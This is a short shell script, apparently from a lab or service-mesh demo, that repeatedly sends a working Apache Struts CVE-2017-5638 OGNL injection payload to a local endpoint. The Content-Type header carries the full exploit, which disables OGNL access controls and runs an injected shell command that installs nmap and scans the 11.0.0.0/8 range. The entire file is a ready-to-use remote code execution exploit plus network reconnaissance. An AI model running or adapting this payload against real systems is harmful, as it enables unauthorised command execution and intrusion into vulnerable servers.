#!/bin/sh

# apt-get won't actually install nmap because of Istio
command='/usr/bin/apt-get install -y nmap; nmap -sS -sV -O --top-ports 1000 --script=banner.nse,http-headers.nse 11.0.0.0/8'

while true; do
  curl -i -v -s -k \
    -X GET \
    -H "User-Agent: curl" \
    -H "Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='${command}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
    http://localhost:8080/apachestruts-cve20175638.action &
  pid="$!"
  sleep 5
  kill -9 "$pid" || true
  sleep 60
done
